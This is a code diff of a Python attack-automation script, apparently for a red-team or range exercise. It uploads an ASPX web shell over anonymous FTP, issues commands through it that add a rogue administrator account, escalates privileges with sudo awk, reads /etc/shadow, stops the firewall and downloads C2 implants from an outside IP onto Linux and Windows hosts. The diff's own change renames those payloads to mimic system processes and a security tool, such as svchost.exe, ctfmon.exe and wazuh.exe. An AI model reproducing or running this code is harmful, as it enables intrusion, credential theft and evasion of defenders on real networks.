@@ -71,7 +71,7 @@ def phaseOne():
 	quote PASS anonymous@
 	cd uploads
 	ls
-	put sudowoodo.aspx
+	put diagnostics.aspx
 	quit
 	"""
 	subprocess.run(["ftp", "-n", target_ip], input=ftp_script, text=True)
@@ -81,20 +81,20 @@ def phaseOne():
 	pwd = "pwd"
 	listDesktop = "dir%20C%3A%5CUsers%5CAdministrator%5CDesktop"
 	getDocument = "type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Clazy%5Fadmin%2Etxt"
-	#Add evil admin account with password123! as  the password.
+	#Add evil admin account named yujrio.hanma with password123! as  the password.
 	addEvilAdmin = "net%20user%20%2Fadd%20evil%20password123%21"
 	# Add evil admin to administrators group
 	addAdminGroup = "net%20localgroup%20administrators%20yujiro%2Ehanma%20%2Fadd"
 	systeminfo = "systeminfo"
 	log_event(f"initiation curl command injections against {target_ip}!")
 	# Set up URL Encoded curl requests
-	#curlone = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={whoami}"
-	#curltwo = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={dir}"
-	#curlthree = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={listDesktop}"
-	#curlfour = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={getDocument}"
-	#curlfive = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addEvilAdmin}"
-	#curlsix = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addAdminGroup}"
-	#curlseven = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={systeminfo}"
+	#curlone = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={whoami}"
+	#curltwo = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={dir}"
+	#curlthree = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={listDesktop}"
+	#curlfour = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={getDocument}"
+	#curlfive = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addEvilAdmin}"
+	#curlsix = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addAdminGroup}"
+	#curlseven = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={systeminfo}"
 	# Execute requests
 	#subprocess.run(curlone, shell=True, text=True)
 	#subprocess.run(curltwo, shell=True, text=True)
@@ -103,13 +103,13 @@ def phaseOne():
 	#subprocess.run(curlfive, shell=True, text=True)
 	#subprocess.run(curlsix, shell=True, text=True)	
 	commands = [
-	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={whoami}",
-	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={pwd}",
-	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={listDesktop}",
-	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={getDocument}",
-	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addEvilAdmin}",
-	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addAdminGroup}",
-	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={systeminfo}"
+	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={whoami}",
+	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={pwd}",
+	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={listDesktop}",
+	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={getDocument}",
+	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addEvilAdmin}",
+	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addAdminGroup}",
+	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={systeminfo}"
 	]
 
 	# Execute requests using a for loop
@@ -139,8 +139,8 @@ def phaseTwo():
 	log_event(f"Initiating Crackmapexec over ssh against target {subnet}")
 	subprocess.run(cme, shell=True, text=True)
 	# Initial SSH Connection, enumerate, and then perform privesc
-	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://185.141.62.2:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow\")}'"
-	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c /root/raichu &\")}'"
+	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://185.141.62.2:8000/agetty -o /root/agetty\ && chmod +x /root/agetty && cat /etc/shadow\")}'"
+	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c /root/agetty &\")}'"
 	commands = [
 	"whoami",
 	f"echo {password} | sudo -S -l",
@@ -229,12 +229,12 @@ def phaseThreept2():
 	username = "backup"
 	password = "michaelwashere"
 	print("starting part two..")
-	sliverC2 = "sudo /root/lucario &"
+	sliverC2 = "sudo /root/zsh &"
 	commands = [
 	"rm -rf /var/log/mon/backup.sh",
 	"sudo systemctl stop firewalld",
-	"curl http://185.141.62.2:8000/lucario -o /root/lucario",
-	"chmod +x /root/lucario",
+	"curl http://185.141.62.2:8000/zsh -o /root/zsh",
+	"chmod +x /root/zsh",
 	]
 	client = paramiko.SSHClient()
 	try:
@@ -286,7 +286,13 @@ def phaseFour():
 	#subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL","alives.txt","-oN","enum.txt"])
 	subnets = [
 	"208.11.20.0/24",
-	"208.11.21.0/24"
+	"208.11.21.0/27",
+	"208.11.21.32/27",
+	"208.11.21.64/27",
+	"208.11.21.128/27",
+	"208.11.21.160/27",
+	"208.11.21.192/27",
+	"208.11.21.224/27"
 	]
 	alive_hosts = []
 
@@ -334,14 +340,14 @@ def phaseFive():
 	print(f"Proceed with manual impacket-psexec and evil-winrm tasks.")
 
 	# The following is for DC2
-	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/haunter.exe -out C:\Users\Administrator\Music\haunter.exe"
-	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\haunter.exe --CollectionMethods All --zipfilename zubat.zip"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/svchost.exe -out C:\Users\Administrator\Music\svchost.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\svchost.exe --CollectionMethods All --zipfilename zubat.zip"
 	# impacket-psexec {username}:{password}@target "powershell.exe -c copy-item -Path C:\Users\Administrator\Music\*.zip -destination \\185.141.62.2\tmp"
-	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/porygon.exe -out C:\Users\Administrator\Pictures\porygon.exe"
-	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Pictures\porygon.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/ctfmon.exe -out C:\Users\Administrator\Pictures\ctfmon.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Pictures\ctfmon.exe"
 	# The following is for Maint Laptop 208.11.23.1
-	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/missingno.exe -out C:\Users\Administrator\Music\missingno.exe"
-	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\missingno.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/wazuh.exe -out C:\Users\Administrator\Music\wazuh.exe"
+	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\wazuh.exe"
 
 
 
